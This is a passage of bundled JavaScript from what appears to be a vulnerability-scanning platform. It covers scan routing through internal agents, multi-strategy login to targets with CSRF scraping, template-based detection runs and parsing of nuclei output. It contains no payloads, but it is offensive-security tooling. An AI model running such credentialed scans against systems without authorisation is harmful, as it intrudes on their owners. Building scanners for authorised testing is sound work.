          `[ScanForge-Ember] Scan ${requestId} completed: ${result.findings.length} findings, ${result.errors.length} errors`
        );
        return result;
      }
      /**
       * Get the result of a completed scan.
       */
      getResult(requestId) {
        return this.completedResults.get(requestId) || null;
      }
      /**
       * Check if a scan is still pending.
       */
      isPending(requestId) {
        return this.pendingRequests.has(requestId);
      }
      /**
       * Get all pending scan requests for an engagement.
       */
      getPendingForEngagement(engagementId) {
        return Array.from(this.pendingRequests.values()).filter((r) => r.engagementId === engagementId);
      }
      /**
       * Get all completed results for an engagement.
       */
      getResultsForEngagement(engagementId) {
        return Array.from(this.completedResults.values()).filter((r) => {
          const req = this.pendingRequests.get(r.requestId);
          return true;
        });
      }
      /**
       * Cancel a pending scan.
       */
      cancelScan(requestId) {
        const request = this.pendingRequests.get(requestId);
        if (!request) return false;
        this.pendingRequests.delete(requestId);
        for (const [taskId, reqId] of this.taskToRequest) {
          if (reqId === requestId) this.taskToRequest.delete(taskId);
        }
        console.log(`[ScanForge-Ember] Scan ${requestId} cancelled`);
        return true;
      }
      /**
       * Get bridge statistics.
       */
      getStats() {
        let totalFindings = 0;
        for (const result of this.completedResults.values()) {
          totalFindings += result.findings.length;
        }
        return {
          pendingScans: this.pendingRequests.size,
          completedScans: this.completedResults.size,
          totalFindings,
          taskMappings: this.taskToRequest.size
        };
      }
      /**
       * Create a scan request from a ScanForge template.
       */
      static createRequestFromTemplate(scanId, engagementId, templateId, scanType, target, options) {
        return {
          requestId: `ember-${randomUUID2().slice(0, 8)}`,
          scanId,
          engagementId,
          scanType,
          target,
          config: {
            intensity: 3,
            maxConcurrent: 10,
            rateLimit: 50,
            followRedirects: true,
            ...options
          },
          templateId,
          priority: 5,
          timeoutSeconds: 600,
          createdAt: Date.now()
        };
      }
    };
  }
});

// server/scanforge/engine/auth-scanner.ts
import { randomUUID as randomUUID3 } from "crypto";
var AuthScanner;
var init_auth_scanner = __esm({
  "server/scanforge/engine/auth-scanner.ts"() {
    "use strict";
    AuthScanner = class {
      constructor() {
        this.sessions = /* @__PURE__ */ new Map();
      }
      /**
       * Authenticate to the target and establish a session.
       */
      async authenticate(config2) {
        const sessionId = randomUUID3();
        console.log(`[AuthScanner] Authenticating via ${config2.strategy} to ${config2.loginUrl || "target"}`);
        let session;
        switch (config2.strategy) {
          case "form_login":
            session = await this.formLogin(sessionId, config2);
            break;
          case "bearer_token":
            session = this.bearerTokenAuth(sessionId, config2);
            break;
          case "cookie":
            session = this.cookieAuth(sessionId, config2);
            break;
          case "oauth2_client":
            session = await this.oauth2Auth(sessionId, config2);
            break;
          case "basic_auth":
            session = this.basicAuth(sessionId, config2);
            break;
          case "api_key":
            session = this.apiKeyAuth(sessionId, config2);
            break;
          default:
            throw new Error(`Unsupported auth strategy: ${config2.strategy}`);
        }
        this.sessions.set(sessionId, session);
        console.log(`[AuthScanner] Session ${sessionId} established via ${config2.strategy}`);
        return session;
      }
      /**
       * Build an authenticated request with session credentials.
       */
      buildRequest(sessionId, url, method = "GET", body, extraHeaders) {
        const session = this.sessions.get(sessionId);
        if (!session) throw new Error(`Session ${sessionId} not found`);
        session.requestCount++;
        const headers = {
          "User-Agent": "ScanForge/1.0 AuthScanner",
          ...extraHeaders
        };
        if (session.token) {
          if (session.strategy === "bearer_token" || session.strategy === "oauth2_client") {
            headers["Authorization"] = `Bearer ${session.token}`;
          } else if (session.strategy === "basic_auth") {
            headers["Authorization"] = session.token;
          } else if (session.strategy === "api_key") {
            const [headerName, value] = session.token.split(": ", 2);
            headers[headerName] = value;
          }
        }
        let cookieStr;
        if (session.cookies.size > 0) {
          cookieStr = Array.from(session.cookies.entries()).map(([k, v]) => `${k}=${v}`).join("; ");
          headers["Cookie"] = cookieStr;
        }
        return { url, method, headers, body, cookies: cookieStr };
      }
      /**
       * Execute an authenticated fetch request.
       */
      async authenticatedFetch(sessionId, url, method = "GET", body, extraHeaders, timeoutMs = 1e4) {
        const req = this.buildRequest(sessionId, url, method, body, extraHeaders);
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), timeoutMs);
        try {
          const start = Date.now();
          const response = await fetch(req.url, {
            method: req.method,
            headers: req.headers,
            body: req.body,
            signal: controller.signal,
            redirect: "follow"
          });
          const responseTime = Date.now() - start;
          const setCookies = response.headers.getSetCookie?.() || [];
          for (const cookie of setCookies) {
            const [nameValue] = cookie.split(";");
            const [name, value] = nameValue.split("=", 2);
            if (name && value) {
              const session = this.sessions.get(sessionId);
              session?.cookies.set(name.trim(), value.trim());
            }
          }
          const responseBody = await response.text();
          const responseHeaders = {};
          response.headers.forEach((v, k) => {
            responseHeaders[k] = v;
          });
          return {
            status: response.status,
            headers: responseHeaders,
            body: responseBody,
            responseTime
          };
        } finally {
          clearTimeout(timeout);
        }
      }
      /**
       * Check if a session is still valid.
       */
      async checkSession(sessionId, config2) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        if (!config2.sessionCheckUrl) {
          if (config2.reAuthAfterRequests && session.requestCount >= config2.reAuthAfterRequests) {
            session.isValid = false;
            return false;
          }
          if (config2.reAuthIntervalMs && Date.now() - session.authenticatedAt >= config2.reAuthIntervalMs) {
            session.isValid = false;
            return false;
          }
          return true;
        }
        try {
          const result = await this.authenticatedFetch(sessionId, config2.sessionCheckUrl);
          const expectedStatus = config2.sessionCheckStatus || 200;
          let valid = result.status === expectedStatus;
          if (valid && config2.sessionCheckPattern) {
            valid = new RegExp(config2.sessionCheckPattern).test(result.body);
          }
          session.isValid = valid;
          session.lastCheckedAt = Date.now();
          if (!valid) {
            console.log(`[AuthScanner] Session ${sessionId} expired \u2014 will re-authenticate`);
          }
          return valid;
        } catch {
          session.isValid = false;
          return false;
        }
      }
      /**
       * Re-authenticate if session has expired.
       */
      async ensureAuthenticated(sessionId, config2) {
        const isValid = await this.checkSession(sessionId, config2);
        if (isValid) {
          return this.sessions.get(sessionId);
        }
        console.log(`[AuthScanner] Re-authenticating session ${sessionId}`);
        this.sessions.delete(sessionId);
        return this.authenticate(config2);
      }
      /**
       * Logout and destroy session.
       */
      async logout(sessionId, config2) {
        if (config2.logoutUrl) {
          try {
            await this.authenticatedFetch(sessionId, config2.logoutUrl, "POST");
          } catch {
          }
        }
        this.sessions.delete(sessionId);
        console.log(`[AuthScanner] Session ${sessionId} destroyed`);
      }
      /**
       * Get active session count.
       */
      getActiveSessionCount() {
        return this.sessions.size;
      }
      /**
       * Get session info.
       */
      getSession(sessionId) {
        return this.sessions.get(sessionId);
      }
      // ─── Auth Strategy Implementations ────────────────────────────────────────
      async formLogin(sessionId, config2) {
        const { credentials, loginUrl } = config2;
        if (!loginUrl) throw new Error("Form login requires loginUrl");
        if (!credentials.username || !credentials.password) {
          throw new Error("Form login requires username and password");
        }
        const session = {
          id: sessionId,
          strategy: "form_login",
          cookies: /* @__PURE__ */ new Map(),
          authenticatedAt: Date.now(),
          requestCount: 0,
          isValid: true,
          lastCheckedAt: Date.now()
        };
        try {
          const loginPage = await fetch(loginUrl, {
            redirect: "follow",
            headers: { "User-Agent": "ScanForge/1.0 AuthScanner" }
          });
          const setCookies = loginPage.headers.getSetCookie?.() || [];
          for (const cookie of setCookies) {
            const [nameValue] = cookie.split(";");
            const [name, value] = nameValue.split("=", 2);
            if (name && value) session.cookies.set(name.trim(), value.trim());
          }
          const pageBody = await loginPage.text();
          let csrfToken;
          let csrfFieldName = credentials.formFields?.csrfField;
          if (!csrfFieldName) {
            const csrfMatch = pageBody.match(
              /name=["']?(csrf[_-]?token|_token|csrfmiddlewaretoken|authenticity_token|user_token|__RequestVerificationToken)["']?\s+value=["']?([^"'\s>]+)/i
            );
            if (csrfMatch) {
              csrfFieldName = csrfMatch[1];
              csrfToken = csrfMatch[2];
            }
          }
          const formData = new URLSearchParams();
          formData.set(credentials.formFields?.usernameField || "username", credentials.username);
          formData.set(credentials.formFields?.passwordField || "password", credentials.password);
          if (csrfFieldName && csrfToken) {
            formData.set(csrfFieldName, csrfToken);
          }
          if (credentials.formFields?.extraFields) {
            for (const [k, v] of Object.entries(credentials.formFields.extraFields)) {
              formData.set(k, v);
            }
          }
          const cookieStr = Array.from(session.cookies.entries()).map(([k, v]) => `${k}=${v}`).join("; ");
          const loginResponse = await fetch(loginUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
              "User-Agent": "ScanForge/1.0 AuthScanner",
              "Cookie": cookieStr
            },
            body: formData.toString(),
            redirect: "follow"
          });
          const loginCookies = loginResponse.headers.getSetCookie?.() || [];
          for (const cookie of loginCookies) {
            const [nameValue] = cookie.split(";");
            const [name, value] = nameValue.split("=", 2);
            if (name && value) session.cookies.set(name.trim(), value.trim());
          }
          const responseUrl = loginResponse.url;
          if (responseUrl === loginUrl && loginResponse.status !== 200) {
            throw new Error(`Form login failed \u2014 redirected back to login page`);
          }
          console.log(`[AuthScanner] Form login successful: ${session.cookies.size} cookies obtained`);
        } catch (err) {
          session.isValid = false;
          throw new Error(`Form login failed: ${err.message}`);
        }
        return session;
      }
      bearerTokenAuth(sessionId, config2) {
        if (!config2.credentials.token) throw new Error("Bearer token auth requires token");
        return {
          id: sessionId,
          strategy: "bearer_token",
          cookies: /* @__PURE__ */ new Map(),
          token: config2.credentials.token,
          authenticatedAt: Date.now(),
          requestCount: 0,
          isValid: true,
          lastCheckedAt: Date.now()
        };
      }
      cookieAuth(sessionId, config2) {
        if (!config2.credentials.cookies) throw new Error("Cookie auth requires cookies");
        const cookies = new Map(Object.entries(config2.credentials.cookies));
        return {
          id: sessionId,
          strategy: "cookie",
          cookies,
          authenticatedAt: Date.now(),
          requestCount: 0,
          isValid: true,
          lastCheckedAt: Date.now()
        };
      }
      async oauth2Auth(sessionId, config2) {
        const { credentials } = config2;
        if (!credentials.clientId || !credentials.clientSecret || !credentials.tokenEndpoint) {
          throw new Error("OAuth2 client credentials requires clientId, clientSecret, and tokenEndpoint");
        }
        const body = new URLSearchParams({
          grant_type: "client_credentials",
          client_id: credentials.clientId,
          client_secret: credentials.clientSecret
        });
        if (credentials.scopes?.length) {
          body.set("scope", credentials.scopes.join(" "));
        }
        const response = await fetch(credentials.tokenEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: body.toString()
        });
        if (!response.ok) {
          throw new Error(`OAuth2 token request failed: ${response.status}`);
        }
        const tokenData = await response.json();
        return {
          id: sessionId,
          strategy: "oauth2_client",
          cookies: /* @__PURE__ */ new Map(),
          token: tokenData.access_token,
          authenticatedAt: Date.now(),
          requestCount: 0,
          isValid: true,
          lastCheckedAt: Date.now()
        };
      }
      basicAuth(sessionId, config2) {
        const { credentials } = config2;
        if (!credentials.username || !credentials.password) {
          throw new Error("Basic auth requires username and password");
        }
        const encoded = Buffer.from(`${credentials.username}:${credentials.password}`).toString("base64");
        return {
          id: sessionId,
          strategy: "basic_auth",
          cookies: /* @__PURE__ */ new Map(),
          token: `Basic ${encoded}`,
          authenticatedAt: Date.now(),
          requestCount: 0,
          isValid: true,
          lastCheckedAt: Date.now()
        };
      }
      apiKeyAuth(sessionId, config2) {
        const { credentials } = config2;
        if (!credentials.apiKey) throw new Error("API key auth requires apiKey");
        const headerName = credentials.apiKeyHeader || "X-API-Key";
        return {
          id: sessionId,
          strategy: "api_key",
          cookies: /* @__PURE__ */ new Map(),
          token: `${headerName}: ${credentials.apiKey}`,
          authenticatedAt: Date.now(),
          requestCount: 0,
          isValid: true,
          lastCheckedAt: Date.now()
        };
      }
    };
  }
});

// server/scanforge/engine/engagement-integration.ts
import * as path from "path";
import * as fs from "fs";
import { fileURLToPath } from "url";
import { dirname } from "path";
async function executeScanForgePhase(config2, addLog2, onFinding) {
  const startTime = Date.now();
  addLog2({
    phase: "vuln_detection",
    type: "scan_start",
    title: "ScanForge Scan Phase Started",
    detail: `Scanning ${config2.targets.length} targets with template-based detection engine`
  });
  const result = {
    engagementId: config2.engagementId,
    findings: [],
    stats: {
      templatesExecuted: 0,
      targetsScanned: 0,
      findingsTotal: 0,
      findingsVerified: 0,
      findingsBySeverity: { critical: 0, high: 0, medium: 0, low: 0, info: 0 },
      executionTimeMs: 0,
      emberRoutedScans: 0
    }
  };
  try {
    const templateEngine = new TemplateEngine();
    const candidatePaths = [
      path.join(__esm_dirname, "../templates/definitions"),
      // ESM relative (dev)
      path.join(process.cwd(), "server", "scanforge", "templates", "definitions"),
      // process.cwd() based (Docker)
      path.join("/usr/src/app", "server", "scanforge", "templates", "definitions")
      // Hardcoded Docker path
    ];
    const templatesDir = candidatePaths.find((p) => fs.existsSync(p)) || candidatePaths[0];
    if (!fs.existsSync(templatesDir)) {
      addLog2({ phase: "vuln_detection", type: "warning", title: "ScanForge Templates Missing", detail: `Template directory not found. Tried: ${candidatePaths.join(", ")}` });
      return result;
    }
    const templateFiles = fs.readdirSync(templatesDir).filter((f) => f.endsWith(".json"));
    const templates = [];
    for (const file of templateFiles) {
      try {
        const content = fs.readFileSync(path.join(templatesDir, file), "utf-8");
        const tmpl = JSON.parse(content);
        if (config2.templateCategories && config2.templateCategories.length > 0) {
          if (!config2.templateCategories.includes(tmpl.category)) continue;
        }
        if (tmpl.request && !tmpl.requests) {
          tmpl.requests = [tmpl.request];
        }
        templates.push(tmpl);
      } catch {
      }
    }
    addLog2({
      phase: "vuln_detection",
      type: "info",
      title: "ScanForge Templates Loaded",
      detail: `Loaded ${templates.length} detection templates from ${templateFiles.length} files`
    });
    const templateIds = templates.map((t) => t.id || t.templateId);
    const confidenceMap = await getTemplateConfidenceMap(templateIds);
    const targetUrls = config2.targets.map((t) => t.url || t.ip || "");
    try {
      const researchInputs = await runTargetedResearch(
        config2.engagementId,
        targetUrls.filter(Boolean),
        config2.targetType
      );
      if (researchInputs.length > 0) {
        addLog2({
          phase: "vuln_detection",
          type: "info",
          title: "ScanForge Deep Research Complete",
          detail: `Gathered ${researchInputs.length} intelligence inputs from TI feeds for targeted scanning`
        });
      }
    } catch (err) {
      console.warn("[ScanForge Integration] Targeted research failed:", err.message);
    }
    let proofEngine = null;
    if (config2.enableProofVerification) {
      proofEngine = new ProofEngine();
    }
    let emberBridge = null;
    if (config2.enableEmberRouting && config2.emberAgentIds && config2.emberAgentIds.length > 0) {
      emberBridge = new ScanForgeEmberBridge(config2.engagementId);
      addLog2({
        phase: "vuln_detection",
        type: "info",
        title: "ScanForge Ember Bridge Active",
        detail: `Routing internal scans through ${config2.emberAgentIds.length} Ember agent(s)`
      });
    }
    const authScanner = new AuthScanner();
    const targetAuthSessions = /* @__PURE__ */ new Map();
    if (config2.enableAuthenticatedScanning !== false) {
      for (const target of config2.targets) {
        const creds = target.credentials || [];
        const webCreds = creds.filter((c) => ["http", "web", "form", "http-get", "http-post-form"].includes(c.service));
        if (webCreds.length > 0) {
          const cred = webCreds[0];
          const targetUrl = target.url || `http://${target.ip}:${target.port || 80}`;
          const loginUrl = cred.loginPath ? `${targetUrl}${cred.loginPath.startsWith("/") ? "" : "/"}${cred.loginPath}` : `${targetUrl}/login`;
          const authConfig = {
            strategy: "form_login",
            loginUrl,
            credentials: {
              username: cred.username,
              password: cred.password
            },
            reAuthAfterRequests: 200,
            // Re-authenticate after 200 requests
            reAuthIntervalMs: 5 * 60 * 1e3
            // Re-authenticate every 5 minutes
          };
          try {
            const session = await authScanner.authenticate(authConfig);
            targetAuthSessions.set(targetUrl, { sessionId: session.id, config: authConfig });
            addLog2({
              phase: "vuln_detection",
              type: "info",
              title: `\u{1F511} ScanForge Auth: ${target.hostname || target.ip}`,
              detail: `Authenticated as ${cred.username} via ${cred.source} credentials (${session.cookies.size} cookies) \u2014 scanning authenticated attack surface`
            });
          } catch (authErr) {
            addLog2({
              phase: "vuln_detection",
              type: "warning",
              title: `\u26A0\uFE0F ScanForge Auth Failed: ${target.hostname || target.ip}`,
              detail: `Could not authenticate as ${cred.username}: ${authErr.message} \u2014 falling back to unauthenticated scanning`
            });
          }
        }
      }
      if (targetAuthSessions.size > 0) {
        addLog2({
          phase: "vuln_detection",
          type: "info",
          title: "ScanForge Authenticated Scanning Active",
          detail: `${targetAuthSessions.size} target(s) with authenticated sessions \u2014 scanning both authenticated and unauthenticated attack surface`
        });
      }
    }
    const internalTargets = config2.targets.filter((t) => t.isInternal);
    const externalTargets = config2.targets.filter((t) => !t.isInternal);
    for (const target of externalTargets) {
      const targetUrl = target.url || `http://${target.ip}:${target.port || 80}`;
      const authSession = targetAuthSessions.get(targetUrl);
      for (const template of templates) {
        try {
          const findings = await executeTemplate(templateEngine, template, targetUrl, confidenceMap);
          if (authSession) {
            try {
              await authScanner.ensureAuthenticated(authSession.sessionId, authSession.config);
              const authFindings = await executeAuthenticatedTemplate(
                templateEngine,
                template,
                targetUrl,
                confidenceMap,
                authScanner,
                authSession.sessionId
              );
              for (const af of authFindings) {
                const isDuplicate = findings.some(
                  (f) => f.templateId === af.templateId && f.title === af.title
                );
                if (!isDuplicate) {
                  af.title = `[Auth] ${af.title}`;
                  af.evidence = `[Authenticated as ${target.credentials?.[0]?.username}] ${af.evidence}`;
                  findings.push(af);
                }
              }
            } catch (authErr) {
              console.debug(`[ScanForge] Authenticated template execution failed for ${template.id}:`, authErr.message);
            }
          }
          for (const finding of findings) {
            if (proofEngine && finding.severity !== "info") {
              try {
                const verified = await proofEngine.verify({
                  templateId: finding.templateId,
                  target: finding.target,
                  originalEvidence: finding.evidence,
                  severity: finding.severity
                });
                finding.verified = verified;
                if (verified) result.stats.findingsVerified++;
              } catch {
                finding.verified = false;
              }
            }
            result.findings.push(finding);
            result.stats.findingsTotal++;
            result.stats.findingsBySeverity[finding.severity] = (result.stats.findingsBySeverity[finding.severity] || 0) + 1;
            await logFinding({
              engagementId: config2.engagementId,
              templateId: finding.templateId,
              findingTitle: finding.title,
              target: finding.target,
              severity: finding.severity,
              confidence: finding.confidence,
              verified: finding.verified,
              evidence: finding.evidence,
              cve: finding.cve
            });
            onFinding(finding);
          }
          result.stats.templatesExecuted++;
        } catch (err) {
          console.warn(`[ScanForge] Template ${template.id} failed on ${targetUrl}:`, err.message);
        }
      }
      result.stats.targetsScanned++;
    }
    if (emberBridge && internalTargets.length > 0) {
      addLog2({
        phase: "vuln_detection",
        type: "scan_start",
        title: "ScanForge Internal Scan via Ember",
        detail: `Routing ${internalTargets.length} internal targets through Ember agents`
      });
      for (const target of internalTargets) {
        const targetUrl = target.url || `http://${target.ip}:${target.port || 80}`;
        try {
          const emberFindings = await emberBridge.scanTarget(
            targetUrl,
            templates.map((t) => t.id || t.templateId),
            config2.emberAgentIds[0]
          );
          for (const finding of emberFindings) {
            result.findings.push(finding);
            result.stats.findingsTotal++;
            result.stats.findingsBySeverity[finding.severity] = (result.stats.findingsBySeverity[finding.severity] || 0) + 1;
            result.stats.emberRoutedScans++;
            await logFinding({
              engagementId: config2.engagementId,
              templateId: finding.templateId,
              findingTitle: finding.title,
              target: finding.target,
              severity: finding.severity,
              confidence: finding.confidence,
              verified: finding.verified,
              evidence: finding.evidence
            });
            onFinding(finding);
          }
        } catch (err) {
          console.warn(`[ScanForge] Ember scan failed for ${targetUrl}:`, err.message);
        }
        result.stats.targetsScanned++;
      }
    }
    result.stats.executionTimeMs = Date.now() - startTime;
    addLog2({
      phase: "vuln_detection",
      type: "scan_result",
      title: "ScanForge Scan Phase Complete",
      detail: `Found ${result.stats.findingsTotal} findings (${result.stats.findingsVerified} verified) across ${result.stats.targetsScanned} targets in ${(result.stats.executionTimeMs / 1e3).toFixed(1)}s | Templates executed: ${result.stats.templatesExecuted} | Ember-routed: ${result.stats.emberRoutedScans}`
    });
  } catch (err) {
    console.error("[ScanForge] Phase crash stack:", err.stack);
    addLog2({
      phase: "vuln_detection",
      type: "error",
      title: "ScanForge Scan Phase Error",
      detail: `ScanForge scan failed: ${err.message}`
    });
    result.stats.executionTimeMs = Date.now() - startTime;
  }
  return result;
}
async function executeAuthenticatedTemplate(engine, template, targetUrl, confidenceMap, authScanner, sessionId) {
  const findings = [];
  const templateId = template.id || template.templateId;
  const confidenceThreshold = confidenceMap.get(templateId) || 0.5;
  for (const request of template.requests || []) {
    try {
      const url = `${targetUrl}${request.path || ""}`;
      const result = await authScanner.authenticatedFetch(
        sessionId,
        url,
        request.method || "GET",
        request.body && request.method !== "GET" ? request.body : void 0,
        {
          "User-Agent": "ScanForge/1.0 (Security Scanner)",
          ...request.headers || {}
        },
        1e4
      );
      let matched = false;
      const matchResults = [];
      for (const matcher of template.matchers || []) {
        const matchResult = checkMatcher(matcher, result.status, result.body, result.headers);
        if (matchResult.matched) {
          matched = true;
          matchResults.push(matchResult.evidence);
        }
      }
      if (matched) {
        const severity = template.severity || "medium";
        const confidence = calculateConfidence(template, matchResults, confidenceThreshold);
        if (confidence >= confidenceThreshold) {
          findings.push({
            templateId,
            templateName: template.name || templateId,
            target: targetUrl,
            severity,
            title: template.name || `${templateId} Detection`,
            description: template.description || `Vulnerability detected by template ${templateId} (authenticated)`,
            evidence: matchResults.join(" | "),
            confidence,
            verified: false,
            cve: template.metadata?.cve,
            cwe: template.metadata?.cwe,
            cvss: template.metadata?.cvss,
            remediation: template.remediation,
            references: template.metadata?.references || [],
            rawResponse: result.body.slice(0, 500)
          });
        }
      }
    } catch (err) {
      if (err.name !== "AbortError") {
        console.debug(`[ScanForge Auth] Request failed for ${templateId}:`, err.message);
      }
    }
  }
  return findings;
}
async function executeTemplate(engine, template, targetUrl, confidenceMap) {
  const findings = [];
  const templateId = template.id || template.templateId;
  const confidenceThreshold = confidenceMap.get(templateId) || 0.5;
  const protocol = (template.protocol || "http").toLowerCase();
  if (!["http", "https"].includes(protocol)) {
    return findings;
  }
  for (const request of template.requests || []) {
    try {
      const url = `${targetUrl}${request.path || ""}`;
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 1e4);
      const fetchOpts = {
        method: request.method || "GET",
        headers: {
          "User-Agent": "ScanForge/1.0 (Security Scanner)",
          ...request.headers || {}
        },
        signal: controller.signal,
        redirect: "follow"
      };
      if (request.body && request.method !== "GET") {
        fetchOpts.body = request.body;
      }
      const response = await fetch(url, fetchOpts);
      clearTimeout(timeout);
      const responseBody = await response.text();
      const responseHeaders = Object.fromEntries(response.headers.entries());
      let matched = false;
      const matchResults = [];
      for (const matcher of template.matchers || []) {
        const matchResult = checkMatcher(matcher, response.status, responseBody, responseHeaders);
        if (matchResult.matched) {
          matched = true;
          matchResults.push(matchResult.evidence);
        }
      }
      if (matched) {
        const severity = template.severity || "medium";
        const confidence = calculateConfidence(template, matchResults, confidenceThreshold);
        if (confidence >= confidenceThreshold) {
          findings.push({
            templateId,
            templateName: template.name || templateId,
            target: targetUrl,
            severity,
            title: template.name || `${templateId} Detection`,
            description: template.description || `Vulnerability detected by template ${templateId}`,
            evidence: matchResults.join(" | "),
            confidence,
            verified: false,
            cve: template.metadata?.cve,
            cwe: template.metadata?.cwe,
            cvss: template.metadata?.cvss,
            remediation: template.remediation,
            references: template.metadata?.references || [],
            rawResponse: responseBody.slice(0, 500)
          });
        }
      }
    } catch (err) {
      if (err.name !== "AbortError") {
        console.debug(`[ScanForge] Request failed for ${templateId}:`, err.message);
      }
    }
  }
  return findings;
}
function checkMatcher(matcher, statusCode, body, headers) {
  const values = matcher.values || [];
  const matchType = matcher.type || "body";
  switch (matchType) {
    case "status": {
      const matched = values.some((v) => String(statusCode) === String(v));
      return { matched, evidence: matched ? `Status: ${statusCode}` : "" };
    }
    case "body": {
      for (const val of values) {
        if (body.includes(val)) {
          const idx = body.indexOf(val);
          const context = body.slice(Math.max(0, idx - 50), idx + val.length + 50);
          return { matched: true, evidence: `Body match: ...${context}...` };
        }
      }
      return { matched: false, evidence: "" };
    }
    case "header": {
      const headerStr = Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join("\n");
      for (const val of values) {
        if (headerStr.toLowerCase().includes(val.toLowerCase())) {
          return { matched: true, evidence: `Header match: ${val}` };
        }
      }
      return { matched: false, evidence: "" };
    }
    case "regex": {
      for (const val of values) {
        try {
          const regex = new RegExp(val, "i");
          const match = body.match(regex);
          if (match) {
            return { matched: true, evidence: `Regex match: ${match[0].slice(0, 100)}` };
          }
        } catch {
        }
      }
      return { matched: false, evidence: "" };
    }
    case "negative_header": {
      for (const val of values) {
        const headerExists = Object.keys(headers).some((k) => k.toLowerCase() === val.toLowerCase());
        if (!headerExists) {
          return { matched: true, evidence: `Missing header: ${val}` };
        }
      }
      return { matched: false, evidence: "" };
    }
    default:
      return { matched: false, evidence: "" };
  }
}
function calculateConfidence(template, matchResults, baseConfidence) {
  let confidence = baseConfidence;
  const totalMatchers = (template.matchers || []).length;
  if (totalMatchers > 0) {
    const matchRatio = matchResults.length / totalMatchers;
    confidence = confidence * (0.7 + 0.3 * matchRatio);
  }
  const severityMultiplier = {
    critical: 0.85,
    high: 0.9,
    medium: 0.95,
    low: 1,
    info: 1
  };
  confidence *= severityMultiplier[template.severity] || 1;
  return Math.min(0.99, Math.max(0.1, confidence));
}
function compareFindings(scanforgeFindings, legacyFindings) {
  const sfSet = new Set(scanforgeFindings.map((f) => normalizeKey(f.title, f.target)));
  const legacySet = new Set(legacyFindings.map((f) => normalizeKey(f.title, f.target)));
  const overlap = [];
  const scanforgeOnly = [];
  const legacyOnly = [];
  for (const key of sfSet) {
    if (legacySet.has(key)) overlap.push(key);
    else scanforgeOnly.push(key);
  }
  for (const key of legacySet) {
    if (!sfSet.has(key)) legacyOnly.push(key);
  }
  return { scanforgeOnly, legacyOnly, overlap };
}
function normalizeKey(title, target) {
  return `${title.toLowerCase().replace(/[^a-z0-9]/g, "")}@${target.replace(/^https?:\/\//, "").split("/")[0]}`;
}
async function runPostEngagementAnalysis(engagementId, scanforgeResult, legacyFindings, addLog2) {
  addLog2({
    phase: "vuln_detection",
    type: "info",
    title: "ScanForge Post-Engagement Analysis",
    detail: `Comparing ${scanforgeResult.stats.findingsTotal} ScanForge findings vs ${legacyFindings.length} legacy tool findings`
  });
  const comparison = compareFindings(scanforgeResult.findings, legacyFindings);
  scanforgeResult.comparison = comparison;
  for (const key of comparison.legacyOnly) {
    const legacyFinding = legacyFindings.find((f) => normalizeKey(f.title, f.target) === key);
    if (legacyFinding) {
      await logFinding({
        engagementId,
        templateId: "MISSED",
        findingTitle: legacyFinding.title,
        target: legacyFinding.target,
        severity: legacyFinding.severity,
        confidence: 0,
        verified: false,
        evidence: `Found by ${legacyFinding.tool} but missed by ScanForge`,
        crossToolMatches: [{ tool: legacyFinding.tool, findingId: key }]
      });
    }
  }
  const verdicts = await assessFindings(engagementId, legacyFindings, "auto-crossref");
  const nucleiCount = legacyFindings.filter((f) => f.tool === "nuclei").length;
  const zapCount = legacyFindings.filter((f) => f.tool === "zap").length;
  await generateEngagementReport(engagementId, { nuclei: nucleiCount, zap: zapCount });
  addLog2({
    phase: "vuln_detection",
    type: "scan_result",
    title: "ScanForge Comparison Report",
    detail: `Overlap: ${comparison.overlap.length} | ScanForge-only: ${comparison.scanforgeOnly.length} | Legacy-only: ${comparison.legacyOnly.length} | Verdicts: TP=${verdicts.tp} FP=${verdicts.fp} FN=${verdicts.fn}`
  });
  try {
    const promotionResults = await runAutoPromotion(engagementId);
    const promoted = promotionResults.filter((r) => r.decision === "promoted");
    const rejected = promotionResults.filter((r) => r.decision === "rejected");
    const deferred = promotionResults.filter((r) => r.decision === "deferred");
    if (promotionResults.length > 0) {
      addLog2({
        phase: "vuln_detection",
        type: "info",
        title: "ScanForge Auto-Promotion Evaluation",
        detail: `Evaluated ${promotionResults.length} templates: ${promoted.length} promoted, ${deferred.length} deferred, ${rejected.length} rejected` + (promoted.length > 0 ? ` | Promoted: ${promoted.map((p) => p.templateId).join(", ")}` : "")
      });
    }
  } catch (err) {
    addLog2({
      phase: "vuln_detection",
      type: "warning",
      title: "ScanForge Auto-Promotion Error",
      detail: `Auto-promotion evaluation failed: ${err?.message ?? "unknown error"}`
    });
  }
}
var __esm_dirname;
var init_engagement_integration = __esm({
  "server/scanforge/engine/engagement-integration.ts"() {
    "use strict";
    init_template_engine();
    init_proof_engine();
    init_ember_bridge();
    init_accuracy_tracker();
    init_auto_promoter();
    init_deep_research_agent();
    init_confidence_tuner();
    init_auth_scanner();
    __esm_dirname = dirname(fileURLToPath(import.meta.url));
  }
});

// server/lib/tool-output-parsers.ts
function parseToolOutput(tool, stdout, asset) {
  const findings = [];
  if (!stdout || stdout.length < 10) return findings;
  switch (tool) {
    case "nuclei": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith("[")) continue;
        try {
          const obj = JSON.parse(trimmed);
          if (obj.info?.severity && obj.info?.name) {
            const cve = obj["matched-at"]?.match(/CVE-\d{4}-\d+/)?.[0] || obj.info?.classification?.cve?.[0] || obj["template-id"]?.match(/CVE-\d{4}-\d+/)?.[0];
            const matchedAt = obj["matched-at"] || obj.host || "";
            const evidence = {};
            if (obj["curl-command"]) {
              const curlMatch = obj["curl-command"].match(/curl\s+(?:-[A-Z]+\s+)?['"]?(https?:\/\/[^'"\s]+)/);
              evidence.request = { method: obj.type === "http" ? "GET" : void 0, url: matchedAt || curlMatch?.[1] };
            } else if (matchedAt) {
              evidence.request = { url: matchedAt };
            }
            if (obj["extracted-results"] && Array.isArray(obj["extracted-results"]) && obj["extracted-results"].length > 0) {
              evidence.proofText = obj["extracted-results"].join("\n");
            }
            if (obj["matcher-name"]) {
              evidence.matchedPattern = obj["matcher-name"];
            }
            if (obj.response) {
              const respStr = typeof obj.response === "string" ? obj.response : "";
              const statusMatch = respStr.match(/^HTTP\/[\d.]+ (\d+)/);
              evidence.response = {
                statusCode: statusMatch ? parseInt(statusMatch[1]) : void 0,
                body: respStr.substring(0, 2e3)
              };
            }
            if (obj.request) {
